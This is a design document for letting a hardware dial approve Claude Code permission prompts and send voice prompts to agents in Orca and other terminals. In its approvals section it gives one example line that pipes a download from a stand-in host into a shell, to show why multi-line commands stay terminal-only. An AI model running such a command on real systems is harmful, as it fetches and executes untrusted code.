# The dial answers and talks to agents outside Harness (Diego, 2026-11-13)

Wave 1a of the device integration roadmap, on top of wave 0
([the Harness device without the app](2026-11-13-device-without-the-app.md)). Wave 0 lists the agents running
anywhere on this computer and shows their state; wave 1a lets the dial act on them: approve or deny Claude Code's
permission prompts, talk to an agent, and tap to open it in Orca.

## Why

Wave 0 shows Claude Code in Orca or Ghostty on the dial, but the dial can only watch it: a tap says "See it in Orca".
The two things a person most wants from across the room are to let a waiting agent go on, and to tell an idle one what
to do next.

## Decided (Diego, 2026-11-13)

- **Scope.** The Claude Code plugin and the Orca adapter. Codex's own adapter (`codex queue`) and herdr come later.
- **Approvals from the dial.** Only the exact pending request; never auto-approve; it expires; none while no dial is
  attached; the first answer, the dial's or the terminal's, wins and the other closes.
- **A plugin of its own,** `harness-device`, in this repository's marketplace (`.claude-plugin/marketplace.json`,
  `plugins/harness-device/`), not inside the `harness` plugin. It holds the approval hook and the mod; one install, one
  consent.
- **Consent and install** happen in the Harness Device menu-bar app (wave 1b, another run). This run gives it the CLI:
  `harness device claude status --json` → `{ supported, installed, enabled, claudeVersion }`,
  `harness device claude enable`, `harness device claude disable`. No menu-bar UI here.
- **Approvals go through Claude Code's `PermissionRequest` hook, the mod only carries voice** (the spike below).
- **The hook waits 5 minutes** for the dial; then the dial's card closes and the terminal's own prompt, which has been
  there all along, carries on alone.
- **Orca: actions only** (option A). Harness already sees Claude Code in Orca through its hooks (wave 0); the adapter adds
  voice (`orca terminal send`) and open (`orca terminal switch`) for those agents, found by their Orca terminal handle.
  No polling of Orca.
- **Voice goes only to an agent that is not working.** A busy agent is refused on the dial; nothing is typed into a
  running turn. This holds for every route, the mod's and Orca's, and for every engine in an Orca terminal (Codex
  included).
- **Claude Code in a Harness pane keeps today's path:** the pane watcher sees the prompt and the dial keys the answer;
  the hook stands aside for those sessions.
- **The plugin reaches Harness through its launcher:** `~/.local/bin/harness` first, then `harness` on `PATH`; with
  neither, the hook decides nothing and the mod stays idle.
- **Platforms:** macOS and Linux. Windows later.
- **The approval card** reads "Allow Bash?" with one line of what it would do, and two answers, "Allow" and "Deny". No
  "always allow".

## The spike (2026-11-13, Claude Code 2.1.323)

A throwaway mod and hook, run in a real interactive session:

1. **The mod's `tool.check` cannot carry approvals.** Holding the check on a timer is cut at the hook's 10 s budget; holding
   it on `$.http.fetch` works and its `allow` lets the call run. But in auto mode `tool.check` sees the same `ask`
   before the classifier, so it would hold calls the classifier then allows; and `$.ui.ask` cannot be dismissed when the
   dial answers first: the stale dialog stays.
2. **`PermissionRequest` carries them.** A command hook in the plugin's `hooks/hooks.json`:
   - runs only when a person is about to be asked (in auto mode, only after the classifier sends the call to the person);
   - the terminal's own prompt appears while the hook still waits;
   - the hook's `allow` closes that prompt and the call runs;
   - when the person answers the prompt first, Claude Code kills the hook at once, and its open request to the daemon
     closes with it;
   - a hook that ends with no decision leaves the prompt as it was.
3. **The built-in guard** (`cc-plugin-sec-default`, loaded with managed settings or a Team or Enterprise login) passes
   over `classic.*` hooks in a user's mod, but not over a plugin's `hooks/hooks.json` hooks. A `PermissionRequest`
   `allow` still yields to deny and ask rules (Claude Code's hooks reference). In the Desktop app and VS Code the hook
   runs beside the host's own prompt, and whichever decides first applies.

## Goal

With Claude Code running in Orca, Ghostty or any terminal on this computer and the plugin enabled, a person at the dial
can allow or deny a waiting permission prompt, say the next prompt to an idle agent, and tap an agent in Orca to bring
its terminal forward. The terminal stays fully usable: whoever answers first wins.

## Design

### Data flow

```
Claude Code (outside a Harness pane), plugin harness-device enabled
  ├─ PermissionRequest hook → hooks/approve → `harness device claude approve`   (one per prompt, waits ≤ 5 min)
  │     POST /api/hook/approval  ── core: check, bound, forward (call) ──▶ devices: Approvals ──▶ the dial's question card
  │     ◀── allow | deny | none                                            ◀── Allow / Deny on the dial
  │     (the person answers in the terminal first → Claude Code kills the hook → the request closes → core tells devices)
  └─ mod (hooks/device.js), voice only
        POST /api/hook/inbox (long poll ≤ 25 s) ── core ──▶ devices: Inbox ◀── a transcript for this session
        ◀── { text } → $.prompt.submit({ text, asUser: true })

Claude Code or Codex in an Orca terminal (hint ORCA_TERMINAL_HANDLE from the wave 0 hook)
  devices: Orca actions ── `orca terminal send --terminal h --text … --enter --wait-submit 5` (voice)
                        └─ `orca terminal switch --terminal h` (open)
```

### The plugin (`plugins/harness-device/`)

- `.claude-plugin/plugin.json`: name `harness-device`; added to `.claude-plugin/marketplace.json` beside `harness`.
- `hooks/hooks.json`: `modules: ["./device.js"]`, and one `PermissionRequest` command hook for every tool, running
  `${CLAUDE_PLUGIN_ROOT}/hooks/approve` with a 330 s timeout (the 5-minute wait and a margin).
- `hooks/approve` (POSIX sh, a few lines): runs `~/.local/bin/harness device claude approve` if it is executable, else
  `harness device claude approve` if `harness` is on `PATH`, else exits 0 with no output. The launcher reads stdin
  itself; the script passes no environment of its own.
- `hooks/device.js`, the mod (voice only; below).
- A README with what it does, what it never does (no auto-approve, no "always allow", nothing leaves the computer), and
  how to remove it.

### Approvals

**The hook's client, `harness device claude approve`** (hidden from `--help`; outside the core):

- Reads the hook's stdin JSON, at most 256 KB; anything else is no decision.
- Never asks the dial for a tool that needs the person anyway (`AskUserQuestion`, `ExitPlanMode`): no decision at once.
- Builds a summary of one line, at most 200 bytes of UTF-8, cut on a character boundary: Bash → the command's first
  line; Edit, Write, NotebookEdit, Read → the file path; WebFetch → the URL's host; an MCP tool → its server and tool
  name; anything else → the tool's name. The rest of `tool_input` stays in the hook. (The round dial takes a question of
  at most 256 bytes that `ui_can_display` can draw; "Allow <tool>?\n" and the summary fit.)
- **A card always shows the command** (PM, 2026-11-13). A character the dial cannot draw (CJK, an emoji) would make
  today's firmware refuse the whole question, so the devices process replaces each such character with `?` when it
  builds the card, using the round dial's drawable set; the summary line is never dropped.
- **The dial approves only a command it can show whole** (Diego, 2026-11-14). A Bash command of more than one non-blank
  line, or whose line is over 200 bytes, would show only part of what Allow approves (`npm test\ncurl evil.sh | sh`
  would read "npm test"). For such a command the client still posts, marked `terminalOnly`, and the answer is `none` at
  once: no Allow or Deny on the dial, and the terminal's prompt decides. The dial shows the agent waiting with the line
  "Too long for the dial. Answer in the terminal." A one-line command that fits is approved on the dial as before.
- Posts `{ sessionId, tool, summary, cwd }` to `/api/hook/approval` with the CLI's own client for the daemon's local
  socket (the TypeScript transport under `cli/src/lib/` the other CLI commands use, not `notify.mjs`, which is a
  standalone script), and waits up to 5 minutes.
- **Approvals need the Unix socket; without it the original prompt handles it** (PM, 2026-11-14). Over the TCP port
  nothing proves the answer came from the daemon: another account holding the port while the daemon restarts could
  answer `allow`. So where no socket path fits (the data folder and home both too long), the client posts nothing,
  creates no hook token and gives no decision. The daemon logs once, with no command or path, that dial approvals are
  off because it has no Unix socket, so the person can see why the dial gets none.
- Prints `{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}` for `allow`,
  the same with `"deny"` and the message "Denied from the Harness device." for `deny`, and nothing for `none`. Always
  exits 0: any error, a daemon that is not running, or a timeout is no decision, and the terminal's prompt decides.
- Sends no environment variable: Orca's `ORCA_PAIRING_CODE` and `ORCA_AGENT_SESSION_SPAWN_TOKEN` sit in the same
  environment and must never leave the hook.

**The core routes.** `/api/hook/approval` and `/api/hook/inbox` sit in `hookServer.ts` beside `/api/hook/observed`, with
the same authentication (`hookOk`). Their checks and forwarding live in one new core file, `core/deviceHookCalls.ts`,
listed in `src/architecture.coreFiles.txt` with its reason (hook calls are what the core already receives; it only
forwards them, typed and bounded, to the one component that faces the dial). The devices port gains the matching members
in `core/api.ts`, with fallbacks in `DEVICES_FALLBACKS` (`none` for an approval, `{ off: true }` for a poll), so the devices-in-core path works too.

- **Never starts the devices process.** A call to a service that has never run starts it (`serviceLinks.ts`), so both
  routes first check that the devices process is connected and a dial is watching (`devicesLink`'s watching state);
  otherwise they answer at once: `none` for an approval, 503 for a poll (no device), so the mod can tell it from a
  hold that ran out.

`/api/hook/approval`:

- Accepts `sessionId` ≤ 128 characters, `tool` ≤ 64, `summary` ≤ 200 bytes, `cwd` ≤ 1024, body ≤ 4 KB; else 400.
- At most 4 open approvals per session and 16 in all; more get `none` at once.
- Gives the request an id and forwards it to the devices process as a call with a 5-minute deadline, then answers its
  `allow`, `deny` or `none`; a call that fails or times out is `none`.
- When the client goes before the answer (`res` closes while not yet written: the person answered in the terminal, so
  Claude Code killed the hook), sends the notice `approval.gone { id }`; the devices process then closes the card and
  answers the pending call `none`, which the core drops. (A service call cannot be cancelled from the core.)
- The core keeps only the open requests themselves; it parses nothing beyond the typed fields.

**Approvals in the devices process** (`cli/src/cable/hosts/approvals.ts`):

- No dial connected, or the dial is in a window's tab view (below): `none` at once.
- A session Harness owns (a Harness agent with that session id): `none` at once; the pane path answers it.
- Otherwise the observed agent for `claude` + `sessionId` (created if the hook came first) turns `needs-you`, gains the
  `a` cap while an approval is open, and the dial gets the existing `question` frame: `id: "approval:<uuid>"`, the
  agent's name from the registry (`describe()` falls back to it when the fleet does not know the agent), one question
  `{ key: "approval", q: "Allow Bash?\n<summary>", options: ["Allow", "Deny"], multi: false }` with no `canText`, so the
  round dial shows no `[say]` on it.
- **One card per agent at a time.** The dial and `QuestionInbox` hold one question per agent, so further approvals for
  the same agent (parallel tool calls) wait in order in `Approvals`, and the next card goes out when the current one
  closes. A waiting approval that `approval.gone` removes never shows.
- **An answer counts only for the exact open request.** `CableHost.answer` and `CableHost.answerReviewed` catch a request
  id that starts with `approval:` before the fleet sees it (the reviewed path carries it in `ReviewedAnswer.requestId`).
  It must be that agent's open card; any other is refused with "This request is closed." `Allow` → `allow`, `Deny` →
  `deny`.
- **The first answer wins.** The dial's answer resolves the call and sends `question.close`. `approval.gone` (the
  terminal answered) sends `question.close` and answers the call `none`. After 5 minutes, or when the dial disconnects
  or a window opens, the answer is `none` and the card closes; the agent stays `needs-you` (the terminal's prompt still
  waits) until its next hook event.
- A spoken answer to an approval is refused: "Tap Allow or Deny."

**With a window open nothing changes,** as in wave 0: the dial holds the active tab, which has no observed agents, so
approvals get `none` and observed agents take no voice. The terminal's prompt decides.

### Voice

**The mod (`hooks/device.js`).** On `session.start` it runs the launcher once (`harness device claude link --json`,
hidden) to learn the daemon's Unix socket path (a request over that socket is already trusted, so no credential is
handed out), then keeps one long poll open from a timer:

- `POST /api/hook/inbox { sessionId }` over that socket (`$.http.fetch` with `socketPath`); the daemon holds it up to
  25 s and answers `{ text }` or nothing.
- On `{ text }`: `$.prompt.submit({ text, asUser: true })`, not awaited inside the loop.
- No launcher, no daemon, or no device (the core answers at once when the devices process is not running): try again in
  60 s. A route this daemon does not know (an older Harness): try again in 10 minutes.
- It registers no tool, command, interface or `classic.*` hook, and touches no settings.

**The core route `/api/hook/inbox`:** `sessionId` ≤ 128, body ≤ 1 KB, one open poll per session (a newer one replaces
it); each poll gets an id and goes to the devices process as a call with a 25 s deadline. When the client goes first, or
a newer poll replaces it, the core sends `inbox.gone { pollId }`, so the devices process always knows which polls are
open.

**In the devices process.** An observed agent can take voice (`v`) when its session has a poll open, or one closed under
35 s ago (the mod opens the next at once), or when it has an Orca terminal handle. A transcript for it goes:

1. Refused when the agent is `working` or `needs-you`: `voice.error` "<name> is busy. Say it when it is done." Nothing is
   queued or typed.
2. To the mod when its session has a poll open, or opens one within 5 s: the text is the answer to that poll, and that is
   "sent" (the mod sends no acknowledgement). No poll in 5 s: "<name> did not answer."
3. Else to Orca (`orca terminal send … --enter --wait-submit 5`).

**The dial's voice path.** Today a transcript for an agent goes through `CableHost.sendTurn` (synchronous) to the fleet
and the core, and `lacks('v')` refuses an agent without `v` (wave 0). `sendTurn` becomes async: for an agent the registry
holds outside Harness it calls that source's `send` and answers its `SendResult`; Harness agents keep today's path. The
dial shows the existing `voice.transcript` or `voice.error`.

### Orca actions (`cli/src/cable/hosts/orca.ts`)

- **The handle.** `ORCA_TERMINAL_HANDLE` joins the hook's hint allowlist (`cli/hook/notify.mjs`): the only new name.
  `ORCA_PANE_KEY` is not needed: the handle is what the CLI takes. Wave 0 dropped `ORCA_APP_VERSION`, so the allowlist
  has 9 names, and the core's `MAX_HINTS` (`cli/src/core/observedHook.ts`) equals it: 9. A test holds the two equal, so
  no hint is cut when every one is set and the core takes no more than an honest hook can send.
- **Per agent.** `ObservedSource` reads the hints on every event, not only when it first creates the agent, and keeps the
  handle when it matches `^term_[0-9a-f-]{36}$`. Its `capabilities(agent)` becomes per agent: `s` always, `v` and `f` as
  this section and Voice say, `a` while an approval is open.
- **Open (`f`).** An agent with a handle has `f`. A tap (`agent.open` with no `reason`) runs `orca terminal switch
  --terminal <h> --json`, then on macOS `open -b com.stablyai.orca` so Orca comes forward. An `agent.open` with
  `reason: "question"` (a question screen that came up by itself) never switches Orca. A failure is a toast: "Orca did
  not open it."
- **Voice.** `orca terminal send --terminal <h> --text <t> --enter --wait-submit 5 --json`, under the busy rule above.
- **The command.** `orca` on `PATH`, else `/Applications/Orca.app/Contents/Resources/bin/orca` on macOS. Run with
  `execFile` (no shell), 10 s timeout, text ≤ 2000 characters, at most one Orca command at a time per agent.
- Orca chat sessions have no terminal handle: they take voice only through the mod, and no open.

### The CLI for the menu-bar app

In the `harness` CLI (`cli/src/cli.ts`, a new `device` command), never in the core:

- `harness device claude status --json` → `{ supported, installed, enabled, claudeVersion }`:
  - `claudeVersion`: `claude --version`, found as Harness already finds Claude Code; `null` when not found.
  - `supported`: macOS or Linux and Claude Code ≥ 2.1.287.
  - `installed`, `enabled`: `harness-device@openharness` at user scope in `claude plugin list --json`.
- `harness device claude enable`: adds the marketplace if missing (`claude plugin marketplace add autonomous-ai/openharness
  --sparse .claude-plugin plugins`, as the README already says), then `claude plugin install harness-device@openharness`
  (user scope), or `claude plugin enable` when it is installed but off. Doing it twice does it once. Unsupported:
  exits 1 with "Claude Code 2.1.287 or later is needed."
- `harness device claude disable`: `claude plugin uninstall harness-device@openharness`; the marketplace stays.
- Every `claude` call has a timeout (60 s for install, 15 s for the rest) and its failure is one line on stderr and exit 1.

### The wire and the firmware

No new frame and no new field: approvals use `question`, `answer` / `answer.reviewed`, `question.close` and the `caps`
letters from wave 0. The round firmware already gates answering on `a`, voice on `v` and open on `f`, and shows `[say]`
on a question only with `canText`. No firmware change: a host test (`test_question_ui.py`) shows an approval card with
the longest summary renders, with no `[say]`. Harness Pro is not part of wave 1a.

## Out of scope

Codex's adapter, herdr, cmux and the terminals' own adapters; polling Orca or listing agents from it; "always allow";
approvals for engines other than Claude Code; answering `AskUserQuestion` from the dial; the menu-bar app (wave 1b);
Windows.

## Done when

**Tests**

- `harness device claude approve`: the summary per tool; no decision for `AskUserQuestion` and `ExitPlanMode`; the
  output for each answer; exit 0 on every failure; the posted body never carries `ORCA_PAIRING_CODE`,
  `ORCA_AGENT_SESSION_SPAWN_TOKEN` or any other environment variable (set them in the test and look at the body).
- `notify.mjs`: `ORCA_TERMINAL_HANDLE` is posted; `ORCA_PAIRING_CODE` and `ORCA_AGENT_SESSION_SPAWN_TOKEN` are never
  posted, with both set; all 9 allowlisted hints set at once reach the devices uncut; the core takes 9 and refuses 10.
- Core routes: bounds, the open-request caps, `none` or a 503 at once when the devices process is not connected
  or no dial watches (and the process is not started), `approval.gone` when the client goes first, `inbox.gone` when it
  goes or a newer poll replaces it, the fallbacks; 100% per file (`npm run test:core`).
- Approvals: no dial or a window's tab view → `none`; a Harness-owned session → `none`; the card's frame with the
  agent's name and no `canText`; one card per agent, the next after it closes; only the exact id is accepted, through
  both answer paths, and a stale or other id is refused; the first answer wins and the card closes; `approval.gone`
  closes it or drops a waiting one; expiry, dial disconnect and a window opening give `none`; a spoken answer is refused.
- Voice: refused while working or needs-you; the mod route when a poll is open or opens within 5 s; the Orca route
  otherwise; `sendTurn` reaches `source.send` for an agent outside Harness; `v`, `f` and `a` per agent, following the
  poll, the handle (read on every event) and the open approval.
- Orca actions against a fake `orca`: the arguments, no shell, the timeout, the handle check, the toast on failure; a
  question screen's `agent.open` never switches Orca.
- Round firmware host test: an approval card with the longest summary renders, with no `[say]`.
- A summary with CJK or an emoji reaches the dial with `?` in place of each character it cannot draw, and the card renders
  with its command line.
- The CLI's status, enable and disable against a fake `claude`, enable twice.
- The plugin: `claude plugin validate plugins/harness-device` passes; `claude plugin test` for the mod (a delivered text is
  submitted as the user; no daemon → retry later); `hooks/approve` with no launcher exits 0 with no output.
- End to end: the real daemon, a fake dial, and the real `harness device claude approve` fed a `PermissionRequest`
  input: the dial gets the card; Allow prints the allow decision; killing the client closes the card; no dial → no
  decision at once.

**On a dial** (Diego's Mac and his real Claude Code, after wave 0 merges; the CLI from this branch with
`make install-cli`, the plugin enabled with `harness device claude enable`; afterwards the release CLI is put back,
`harness device claude disable` runs and the folder marketplace is removed. The dial is asked for from the orchestrator
first. The voice checks 4-6 run against a daemon on the staging env file (`HARNESS_ENV_FILE`), never production.)

1. Claude Code in an Orca terminal asks to run a command: the dial shows "Allow Bash?"; Allow runs it and the terminal's
   prompt closes. Deny refuses it.
2. The same, answered in the terminal: the dial's card closes.
3. Auto mode: a command the classifier allows never reaches the dial.
4. An idle Claude Code in Ghostty: a spoken prompt starts a turn. A working one: the dial says it is busy.
5. Codex in an Orca terminal, idle: a spoken prompt starts a turn.
6. Claude Code in an Orca chat: a spoken prompt starts a turn (through the mod).
7. A tap on an Orca agent brings its terminal forward in Orca.
8. `harness device claude disable`: the next prompt never reaches the dial.

## Design notes

- **Data.** Nothing is written to disk. The devices process holds each open approval (session id, tool name, the
  200-character summary) until it is answered, gone or expired, at most 16; and a transcript only until the mod takes it
  (5 s). The summary goes to the dial over its cable, never to the backend, the phone or another machine. Logs carry no
  summary, command, path or transcript: counts and outcomes only.
- **Measures** (daemon log lines, as the dial's notify tally). Approvals shown, allowed, denied, expired and answered in the terminal, with the time to a dial answer;
  voice sends by route (mod, Orca) and refusals by reason. No content and no identifiers.
- **Cost.** With no dial, the hook's client gets `none` at once and the mod polls once a minute per Claude Code session.
  With a dial, one held request per session (25 s) and one `harness` process per open approval. Nothing polls Orca.
- **Failure.** Every path falls back to the terminal: an error, a crash or a timeout is no decision, and the terminal's
  prompt is always there. A command that arrives twice (two answers to one card) resolves once: the first wins.
- **Security.** Only the exact open request is approved, never by rule or pattern; Claude Code's deny and ask rules and
  auto mode's classifier stand (the hook runs after them). The core takes typed, bounded fields; the tool input is cut to
  a summary outside the core. The hook's client reaches the daemon over its local, credential-checked transport, and the
  mod over the Unix socket only the person can open; `link` prints the socket path and no credential.
  Orca's secret variables never leave the hook.
- **Compatibility.** The plugin may be newer than the daemon: an unknown route means no decision and an idle mod. An older
  firmware shows the approval as any question.
- **Platforms.** macOS and Linux; the end-to-end and the dial checks run on macOS. On Windows `status` says
  `supported: false` and `enable` refuses.
